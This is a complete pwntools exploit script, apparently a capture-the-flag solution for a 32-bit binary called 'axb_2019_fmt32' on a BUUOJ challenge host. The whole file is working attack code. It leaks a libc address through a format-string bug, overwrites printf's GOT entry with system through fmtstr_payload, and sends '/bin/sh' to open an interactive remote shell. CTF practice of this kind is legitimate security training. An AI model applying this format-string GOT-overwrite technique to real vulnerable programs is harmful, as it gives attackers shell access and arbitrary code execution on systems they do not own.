#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or "axb_2019_fmt32")
libc = ELF("libc-2.23.so")

host = args.HOST or "node4.buuoj.cn"
port = int(args.PORT or 25731)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# p __libc_start_main
gdbscript = """
b *main
continue
""".format(
    **locals()
)

p = b"A" + p32(exe.got.__libc_start_main) + b"%8$s"

io = start()
io.sendlineafter(b":", p)
leak = u32(io.recv()[14:18])

libc.address = leak - libc.sym.__libc_start_main
success(f"[leak] {hex(leak)}")
success(f"[libc] {hex(libc.address)}")

p = b"A" + fmtstr_payload(8, {exe.got.printf: libc.sym.system}, numbwritten=10)
info(f"[size] {len(p)}")
io.clean()
io.sendline(p)
io.sendline(b";/bin/sh\x00")
io.interactive()
